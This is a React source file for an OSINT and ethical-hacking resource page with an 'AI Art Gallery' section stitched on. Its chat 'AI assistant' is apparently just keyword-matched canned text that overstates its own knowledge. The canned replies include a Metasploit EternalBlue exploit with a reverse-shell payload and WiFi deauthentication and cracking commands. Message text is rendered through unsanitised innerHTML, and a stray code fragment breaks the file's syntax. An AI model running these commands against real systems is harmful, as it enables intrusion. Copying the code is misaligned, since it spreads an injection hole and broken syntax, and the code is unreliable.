/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Search, 
  MessageSquare, 
  Terminal, 
  Github, 
  BookOpen, 
  Scale, 
  HelpCircle, 
  Send, 
  Trash2, 
  XCircle,
  ExternalLink,
  ChevronRight,
  ChevronDown,
  Plus,
  Minus,
  ShieldAlert,
  Zap
} from 'lucide-react';
import { toolDatabase } from './tools';
import { 
  securityCommands, 
  githubRepos, 
  osintResources, 
  ethicalPrinciples, 
  sampleQuestions 
} from './ai-data';
import { Message } from './types';

export default function App() {
  const [searchTerm, setSearchTerm] = useState('');
  const [activeTab, setActiveTab] = useState('chat');
  const [messages, setMessages] = useState<Message[]>([
    { 
      id: '1', 
      content: `👋 Hello! I'm your OSINT & Ethical Hacking AI Assistant.\n\nI have extensive knowledge in:\n• Penetration Testing & Red Teaming\n• Open Source Intelligence (OSINT)\n• Kali Linux (600+ tools)\n• GitHub Security Repositories\n• Network Security & Forensics\n• Web Application Security\n• Incident Response & Malware Analysis\n\nI can help with tool usage, command references, methodologies, and best practices. How can I assist you today?`, 
      sender: 'ai', 
      timestamp: new Date() 
    }
  ]);
  const [chatInput, setChatInput] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showSampleQuestions, setShowSampleQuestions] = useState(false);
  const [openCategories, setOpenCategories] = useState<Record<string, boolean>>({});
  const [activeCategory, setActiveCategory] = useState<string | null>(null);
  
  const chatEndRef = useRef<HTMLDivElement>(null);
  const mainRef = useRef<HTMLElement>(null);

  const filteredCategories = Object.entries(toolDatabase)
    .filter(([catName, tools]) => {
      if (!searchTerm) return true;
      const lowerSearch = searchTerm.toLowerCase();
      return catName.toLowerCase().includes(lowerSearch) || 
             tools.some(tool => tool.name.toLowerCase().includes(lowerSearch) || 
                                tool.tags.some(tag => tag.toLowerCase().includes(lowerSearch)));
    })
    .sort((a, b) => a[0].localeCompare(b[0]));

  useEffect(() => {
    const observerOptions = {
      root: mainRef.current,
      rootMargin: '-20% 0px -70% 0px',
      threshold: 0
    };

    const observerCallback = (entries: IntersectionObserverEntry[]) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          const id = entry.target.id.replace('cat-', '');
          setActiveCategory(id);
        }
      });
    };

    const observer = new IntersectionObserver(observerCallback, observerOptions);
    
    // Observe all category elements
    const categoryElements = document.querySelectorAll('[id^="cat-"]');
    categoryElements.forEach(el => observer.observe(el));

    return () => observer.disconnect();
  }, [filteredCategories]);

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, isLoading]);

  const toggleCategory = (catName: string) => {
    setOpenCategories(prev => ({
      ...prev,
      [catName]: !prev[catName]
    }));
  };

  const openAll = () => {
    const all = Object.keys(toolDatabase).reduce((acc, cat) => {
      acc[cat] = true;
      return acc;
    }, {} as Record<string, boolean>);
    setOpenCategories(all);
  };

  const closeAll = () => {
    setOpenCategories({});
  };

  const generateAIResponse = (input: string) => {
    const lower = input.toLowerCase();
    if (lower.includes('nmap') || lower.includes('recon')) {
      return `## Nmap Reconnaissance Guide\n\n### Essential Commands:\n\`\`\`bash\nnmap -sS target.com\nnmap -sV -sC target.com\nnmap -sS -sV -sC -O -p- target.com\nnmap -sU -p 53,67,68,69,123 target.com\n\`\`\`\n\n### Pro Tips:\n1. Use \`-T4\` for faster scans\n2. \`-oA filename\` outputs all formats\n3. Always have authorization.`;
    } else if (lower.includes('osint') || lower.includes('email')) {
      return `## OSINT for Email Discovery\n\n### Tools:\n- **theHarvester**: \`theharvester -d company.com -b google,linkedin\`\n- **Hunter.io**: browser/API\n- **Google Dorks**: \`site:company.com "email"\`\n- **Breach databases**: HaveIBeenPwned, DeHashed\n\n### Email patterns:\n- first.last@company.com\n- flast@company.com\n\n⚠️ Only for authorized assessments.`;
    } else if (lower.includes('ethical') || lower.includes('practice')) {
      return `## Ethical Hacking Best Practices\n\n1. **Authorization** – written permission.\n2. **Scope** – stay within boundaries.\n3. **Non‑destructive** – avoid damage.\n4. **Confidentiality** – protect findings.\n5. **Documentation** – detailed notes.\n6. **Reporting** – actionable recommendations.\n7. **Legal compliance** – CFAA, GDPR, etc.`;
    } else if (lower.includes('metasploit')) {
      return `## Metasploit Quickstart\n\n\`\`\`bash\nmsfconsole\nsearch eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST your_ip\nexploit\n\`\`\`\n\nPost‑exploitation: \`sysinfo\`, \`getuid\`, \`shell\`.`;
    } else if (lower.includes('kali') || lower.includes('command')) {
      return `## Kali Linux Essentials\n\n### Package management:\n\`\`\`bash\nsudo apt update && sudo apt upgrade\nsudo apt install nmap metasploit-framework\n\`\`\`\n### Network:\n\`\`\`bash\nip a\nnetstat -tulpn\ntcpdump -i eth0\n\`\`\`\n### Forensics:\n\`\`\`bash\nstrings file | grep password\nxxd file.bin\nmd5sum file.iso\n\`\`\``;
    } else if (lower.includes('github') || lower.includes('repo')) {
      return `## Top GitHub Security Repos\n\n- **sherlock-project/sherlock** – username enum\n- **laramies/theHarvester** – email gather\n- **smicallef/spiderfoot** – OSINT automation\n- **swisskyrepo/PayloadsAllTheThings** – payloads\n- **carlospolop/PEASS-ng** – privilege escalation\n\nClone: \`git clone https://github.com/author/repo.git\``;
    } else if (lower.includes('sql') || lower.includes('injection')) {
      return `## SQL Injection Prevention\n\n### Vulnerable:\n\`\`\`php\n$query = "SELECT * FROM users WHERE id = " . $_GET['id'];\n\`\`\`\n### Secure (prepared statement):\n\`\`\`php\n$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");\n$stmt->bind_param("i", $user_id);\n$stmt->execute();\n\`\`\`\n### Defense:\n- Input validation\n- Least privilege\n- WAF (ModSecurity)\n- Regular testing with SQLmap.`;
    } else if (lower.includes('wifi') || lower.includes('wireless')) {
      return `## WiFi Penetration Testing\n\n\`\`\`bash\nairmon-ng start wlan0\nairodump-ng wlan0mon\nairodump-ng -c 6 --bssid MAC -w capture wlan0mon\naireplay-ng -0 10 -a MAC wlan0mon\naircrack-ng -w rockyou.txt capture-01.cap\n\`\`\`\n**Legal:** Only test your own networks.`;
    } else {
      return `I can help with OSINT, ethical hacking, Kali tools, and more. Please ask a specific question (e.g., "How to use Nmap?" or "OSINT email discovery").`;
    }
  };

  const handleSendMessage = () => {
    if (!chatInput.trim() || isLoading) return;
    
    const userMsg: Message = {
      id: Date.now().toString(),
      content: chatInput,
      sender: 'user',
      timestamp: new Date()
    };
    
    setMessages(prev => [...prev, userMsg]);
    setChatInput('');
    setIsLoading(true);
    
    setTimeout(() => {
      const aiMsg: Message = {
        id: (Date.now() + 1).toString(),
        content: generateAIResponse(userMsg.content),
        sender: 'ai',
        timestamp: new Date()
      };
      setMessages(prev => [...prev, aiMsg]);
      setIsLoading(false);
    }, 800);
  };

  const clearChat = () => {
    setMessages([
      { 
        id: '1', 
        content: `👋 Hello! I'm your OSINT & Ethical Hacking AI Assistant.\n\nI have extensive knowledge in:\n• Penetration Testing & Red Teaming\n• Open Source Intelligence (OSINT)\n• Kali Linux (600+ tools)\n• GitHub Security Repositories\n• Network Security & Forensics\n• Web Application Security\n• Incident Response & Malware Analysis\n\nI can help with tool usage, command references, methodologies, and best practices. How can I assist you today?`, 
        sender: 'ai', 
        timestamp: new Date() 
      }
    ]);
  };

  const endChat = () => {
    clearChat();
    setMessages(prev => [...prev, {
      id: Date.now().toString(),
      content: "Chat ended. You can start a new conversation.",
      sender: 'ai',
      timestamp: new Date()
    }]);
  };
                               tool.tags.some(tag => tag.toLowerCase().includes(lowerSearch)));

  return (
    <div className="min-h-screen bg-black text-white flex flex-col">
      <header className="bg-black p-4 border-b border-[#1a1a1a] flex flex-wrap justify-between items-center gap-3 sticky top-0 z-50">
        <div className="logo">OSINT TheClown · AI Art Gallery</div>
        <div className="relative w-full max-w-[320px]">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
          <input 
            className="search w-full pl-10 pr-4 py-2 bg-black border border-[#222] text-white text-base rounded focus:outline-none focus:border-[#2af598]"
            placeholder="Search tools..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
        </div>
      </header>

      <div className="flex flex-1 overflow-hidden flex-col md:flex-row">
        <aside className="sidebar w-full md:w-[250px] border-r border-[#1a1a1a] p-4 overflow-y-auto hidden md:block">
          <h3 className="text-[12px] uppercase text-[#666] tracking-wider mb-3">Categories</h3>
          <ul className="space-y-1">
            {Object.keys(toolDatabase).sort().map(cat => (
              <li 
                key={cat}
                className={`p-2 border-b border-[#111] text-[13px] cursor-pointer transition-colors ${
                  activeCategory === cat 
                    ? 'bg-[#0a0a0a] text-[#2af598] border-l-2 border-l-[#2af598]' 
                    : 'text-[#aaa] hover:bg-[#0a0a0a] hover:text-[#2af598]'
                }`}
                onClick={() => {
                  const element = document.getElementById(`cat-${cat}`);
                  element?.scrollIntoView({ behavior: 'smooth', block: 'start' });
                  if (!openCategories[cat]) toggleCategory(cat);
                }}
              >
                {cat}
              </li>
            ))}
          </ul>
        </aside>

        <main ref={mainRef} className="flex-1 p-4 md:p-8 overflow-y-auto bg-black">
          {/* AI Art Gallery Section */}
          <section className="art-gallery-section mb-12">
            <h1 className="art-title">AI Art Gallery</h1>
            <p className="art-subtitle">Stunning artwork generated by our revolutionary AI technology</p>
            
            <div className="artwork-grid">
              <div className="artwork-item">
                <div className="artwork-title">AI Artwork 1</div>
                <div className="artwork-subtitle">Abstract Nebula</div>
              </div>
              
              <div className="artwork-item">
                <div className="artwork-title">AI Artwork 2</div>
                <div className="artwork-subtitle">Cyberpunk Dreams</div>
              </div>
              
              <div className="artwork-item">
                <div className="artwork-title">AI Artwork 3</div>
                <div className="artwork-subtitle">Surreal Landscapes</div>
              </div>
            </div>
          </section>

          {/* AI Assistant Container */}
          <section className="ai-container border border-[#1a1a1a] bg-black mb-8 rounded-sm overflow-hidden">
            <div className="ai-header bg-black p-3 border-b border-[#1a1a1a] flex justify-between items-center flex-wrap gap-2">
              <h2 className="text-[13px] font-medium flex items-center gap-2">
                <span className="text-[#2af598]">◆</span> OSINT & Ethical Hacking AI
              </h2>
              <div className="ai-status flex gap-2">
                <span className="text-[11px] px-2 py-1 bg-black border border-[#222] rounded text-[#aaa] flex items-center gap-1">
                  <Zap className="w-3 h-3 text-[#2af598]" /> Ethical Mode Active
                </span>
                <span className="text-[11px] px-2 py-1 bg-black border border-[#222] rounded text-[#aaa] flex items-center gap-1">
                  <ShieldAlert className="w-3 h-3 text-yellow-500" /> Auth Required
                </span>
              </div>
            </div>

            <div className="ai-tabs flex bg-black border-b border-[#1a1a1a] px-2 gap-1 overflow-x-auto">
              <button 
                className={`ai-tab flex items-center gap-2 px-4 py-3 text-[12px] border-b-2 transition-all ${activeTab === 'chat' ? 'text-white border-[#2af598] bg-[#0a0a0a]' : 'text-[#aaa] border-transparent hover:text-white hover:bg-[#0a0a0a]'}`}
                onClick={() => setActiveTab('chat')}
              >
                <MessageSquare className="w-4 h-4" /> Chat
              </button>
              <button 
                className={`ai-tab flex items-center gap-2 px-4 py-3 text-[12px] border-b-2 transition-all ${activeTab === 'commands' ? 'text-white border-[#2af598] bg-[#0a0a0a]' : 'text-[#aaa] border-transparent hover:text-white hover:bg-[#0a0a0a]'}`}
                onClick={() => setActiveTab('commands')}
              >
                <Terminal className="w-4 h-4" /> Commands
              </button>
              <button 
                className={`ai-tab flex items-center gap-2 px-4 py-3 text-[12px] border-b-2 transition-all ${activeTab === 'github' ? 'text-white border-[#2af598] bg-[#0a0a0a]' : 'text-[#aaa] border-transparent hover:text-white hover:bg-[#0a0a0a]'}`}
                onClick={() => setActiveTab('github')}
              >
                <Github className="w-4 h-4" /> GitHub
              </button>
              <button 
                className={`ai-tab flex items-center gap-2 px-4 py-3 text-[12px] border-b-2 transition-all ${activeTab === 'resources' ? 'text-white border-[#2af598] bg-[#0a0a0a]' : 'text-[#aaa] border-transparent hover:text-white hover:bg-[#0a0a0a]'}`}
                onClick={() => setActiveTab('resources')}
              >
                <BookOpen className="w-4 h-4" /> Resources
              </button>
              <button 
                className={`ai-tab flex items-center gap-2 px-4 py-3 text-[12px] border-b-2 transition-all ${activeTab === 'ethics' ? 'text-white border-[#2af598] bg-[#0a0a0a]' : 'text-[#aaa] border-transparent hover:text-white hover:bg-[#0a0a0a]'}`}
                onClick={() => setActiveTab('ethics')}
              >
                <Scale className="w-4 h-4" /> Ethics
              </button>
              <button 
                className="ask-me-btn ml-auto flex items-center gap-1 px-3 py-1.5 bg-black border border-[#222] rounded-full text-[11px] text-[#aaa] hover:text-white hover:border-[#2af598] transition-all"
                onClick={() => setShowSampleQuestions(!showSampleQuestions)}
              >
                <HelpCircle className="w-3 h-3" /> Ask Me
              </button>
            </div>

            <div className="ai-content p-4 bg-black min-h-[300px]">
              {activeTab === 'chat' && (
                <div className="flex flex-col h-full">
                  <div className="chat-messages flex flex-col gap-3 max-h-[400px] overflow-y-auto pr-2 mb-4 scrollbar-thin">
                    {messages.map(m => (
                      <div 
                        key={m.id} 
                        className={`message max-w-[85%] p-3 rounded-[18px] text-[13px] leading-relaxed break-words ${m.sender === 'user' ? 'user-message self-end text-white bg-transparent border border-[#333]' : 'bot-message self-start border border-[#222] text-white'}`}
                      >
                        <div dangerouslySetInnerHTML={{ __html: m.content.replace(/\n/g, '<br>') }} />
                        <time className="text-[10px] opacity-70 block mt-1 text-[#aaa]">
                          {m.timestamp.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                        </time>
                      </div>
                    ))}
                    {isLoading && (
                      <div className="typing-indicator flex gap-1 p-3 bg-[#0a0a0a] rounded-[18px] w-fit border border-[#222]">
                        <span className="w-2 h-2 bg-[#aaa] rounded-full animate-bounce" style={{ animationDelay: '0s' }}></span>
                        <span className="w-2 h-2 bg-[#aaa] rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></span>
                        <span className="w-2 h-2 bg-[#aaa] rounded-full animate-bounce" style={{ animationDelay: '0.4s' }}></span>
                      </div>
                    )}
                    <div ref={chatEndRef} />
                  </div>
                  
                  <div className="chat-input-area flex gap-2 flex-wrap">
                    <input 
                      type="text" 
                      className="flex-1 min-w-[200px] bg-black border border-[#222] rounded-full px-4 py-2 text-[13px] text-gray-200 outline-none focus:border-[#2af598]"
                      placeholder="Ask about OSINT, ethical hacking, Kali tools..."
                      value={chatInput}
                      onChange={(e) => setChatInput(e.target.value)}
                      onKeyPress={(e) => e.key === 'Enter' && handleSendMessage()}
                    />
                    <button 
                      className="bg-black border border-[#222] rounded-full px-5 py-2 text-[13px] text-white flex items-center gap-2 hover:bg-[#0a0a0a] hover:border-[#2af598] transition-all disabled:opacity-50"
                      onClick={handleSendMessage}
                      disabled={!chatInput.trim() || isLoading}
                    >
                      <Send className="w-4 h-4" /> Send
                    </button>
                    <button 
                      className="bg-black border border-[#222] rounded-full px-5 py-2 text-[13px] text-white flex items-center gap-2 hover:bg-[#0a0a0a] hover:border-[#2af598] transition-all"
                      onClick={clearChat}
                    >
                      <Trash2 className="w-4 h-4" /> Clear
                    </button>
                    <button 
                      className="bg-black border border-[#222] rounded-full px-5 py-2 text-[13px] text-white flex items-center gap-2 hover:bg-[#0a0a0a] hover:border-[#2af598] transition-all"
                      onClick={endChat}
                    >
                      <XCircle className="w-4 h-4" /> End
                    </button>
                  </div>
                </div>
              )}

              {activeTab === 'commands' && (
                <div className="commands-grid grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
                  {securityCommands.map(cmd => (
                    <div key={cmd.id} className="command-card bg-[#0a0a0a] border border-[#1a1a1a] rounded p-3">
                      <strong className="text-[11px] uppercase text-[#2af598] tracking-wider">{cmd.category}</strong>
                      <pre className="bg-black p-2 rounded border border-[#222] text-[11px] text-[#ccc] my-2 overflow-x-auto">
                        {cmd.command}
                      </pre>
                      <p className="text-[12px] text-gray-400">{cmd.description}</p>
                    </div>
                  ))}
                </div>
              )}

              {activeTab === 'github' && (
                <div className="github-grid grid grid-cols-1 sm:grid-cols-2 gap-3">
                  {githubRepos.map(repo => (
                    <div key={repo.id} className="repo-card bg-[#0a0a0a] border border-[#1a1a1a] rounded p-3 hover:border-[#2af598] transition-all group">
                      <a href={repo.url} target="_blank" rel="noreferrer" className="flex items-center gap-2 font-medium text-[13px] group-hover:underline">
                        {repo.name} <ExternalLink className="w-3 h-3" />
                      </a>
                      <p className="text-[12px] text-[#aaa] my-2">{repo.description}</p>
                      <div className="repo-stats flex gap-4 text-[11px] text-[#aaa]">
                        <span>⭐ {repo.stars.toLocaleString()}</span>
                        <span>🔱 {repo.forks.toLocaleString()}</span>
                        <span className="px-2 py-0.5 bg-black border border-[#222] rounded">{repo.language}</span>
                      </div>
                    </div>
                  ))}
                </div>
              )}

              {activeTab === 'resources' && (
                <div className="resources-grid grid grid-cols-1 sm:grid-cols-2 gap-3">
                  {osintResources.map(res => (
                    <div key={res.name} className="resource-card bg-[#0a0a0a] border border-[#1a1a1a] rounded p-3 hover:border-[#2af598] transition-all group">
                      <a href={res.url} target="_blank" rel="noreferrer" className="flex items-center gap-2 font-medium text-[13px] group-hover:underline">
                        {res.name} <ExternalLink className="w-3 h-3" />
                      </a>
                      <p className="text-[12px] text-[#aaa] mt-2">{res.description}</p>
                    </div>
                  ))}
                </div>
              )}

              {activeTab === 'ethics' && (
                <ul className="principle-list space-y-0">
                  {ethicalPrinciples.map((p, i) => (
                    <li key={i} className="p-3 border-b border-[#1a1a1a] flex items-center gap-3 text-[13px] last:border-0 hover:bg-[#0a0a0a] transition-colors">
                      <ShieldAlert className="w-4 h-4 text-[#2af598] shrink-0" /> {p}
                    </li>
                  ))}
                </ul>
              )}
            </div>

            <AnimatePresence>
              {showSampleQuestions && (
                <motion.div 
                  initial={{ height: 0, opacity: 0 }}
                  animate={{ height: 'auto', opacity: 1 }}
                  exit={{ height: 0, opacity: 0 }}
                  className="sample-questions-panel bg-[#0a0a0a] border-t border-[#222] p-3 overflow-hidden"
                >
                  <div className="sample-questions flex flex-wrap gap-2">
                    {sampleQuestions.map(q => (
                      <button 
                        key={q}
                        className="sample-question px-3 py-1.5 bg-black border border-[#222] rounded-full text-[11px] text-[#ccc] hover:bg-[#111] hover:border-[#2af598] transition-all"
                        onClick={() => {
                          setChatInput(q);
                          setShowSampleQuestions(false);
                        }}
                      >
                        {q}
                      </button>
                    ))}
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </section>

          {/* Categories Section */}
          <section className="categories-section">
            <div className="controls flex justify-end mb-4 gap-2">
              <button 
                className="px-3 py-1.5 bg-black border border-[#222] rounded text-[12px] hover:bg-[#0a0a0a] hover:border-[#2af598] transition-all flex items-center gap-1"
                onClick={openAll}
              >
                <Plus className="w-3 h-3" /> Open All
              </button>
              <button 
                className="px-3 py-1.5 bg-black border border-[#222] rounded text-[12px] hover:bg-[#0a0a0a] hover:border-[#2af598] transition-all flex items-center gap-1"
                onClick={closeAll}
              >
                <Minus className="w-3 h-3" /> Close All
              </button>
            </div>

            <div className="space-y-4">
              {filteredCategories.map(([catName, tools]) => (
                <div key={catName} id={`cat-${catName}`} className="category border border-[#1a1a1a] bg-black rounded-sm overflow-hidden">
                  <div 
                    className="category-header p-3 bg-black flex justify-between items-center cursor-pointer select-none hover:bg-[#0a0a0a] transition-colors"
                    onClick={() => toggleCategory(catName)}
                  >
                    <span className="text-[13px] font-medium">{catName}</span>
                    <span className="text-[#2af598] text-lg font-bold">
                      {openCategories[catName] ? <ChevronDown className="w-4 h-4" /> : <ChevronRight className="w-4 h-4" />}
                    </span>
                  </div>
                  
                  <AnimatePresence>
                    {openCategories[catName] && (
                      <motion.div 
                        initial={{ height: 0 }}
                        animate={{ height: 'auto' }}
                        exit={{ height: 0 }}
                        className="overflow-hidden"
                      >
                        <div className="category-content p-3 border-t border-[#1a1a1a]">
                          <div className="links grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-3">
                            {tools.map(tool => (
                              <div key={tool.name} className="link-card bg-[#0a0a0a] border border-[#1a1a1a] p-3 rounded hover:border-[#2af598] transition-all group">
                                <a href={tool.url} target="_blank" rel="noreferrer" className="text-white text-[12px] font-medium group-hover:text-[#2af598] flex items-center gap-1">
                                  {tool.name} <ExternalLink className="w-3 h-3 opacity-0 group-hover:opacity-100 transition-opacity" />
                                </a>
                                <div className="flex flex-wrap gap-1 mt-2">
                                  {tool.tags.map(tag => (
                                    <span key={tag} className="tag text-[10px] text-[#666] bg-black px-1.5 py-0.5 rounded border border-[#222]">
                                      {tag}
                                    </span>
                                  ))}
                                </div>
                              </div>
                            ))}
                          </div>
                        </div>
                      </motion.div>
                    )}
                  </AnimatePresence>
                </div>
              ))}
            </div>
          </section>

          <footer className="footer mt-12 py-8 border-t border-[#1a1a1a] text-center text-[#666] text-[12px]">
            OSINT TheClown · AI Art Gallery · Ethical Hacking Resource
          </footer>
        </main>
      </div>
    </div>
  );
}
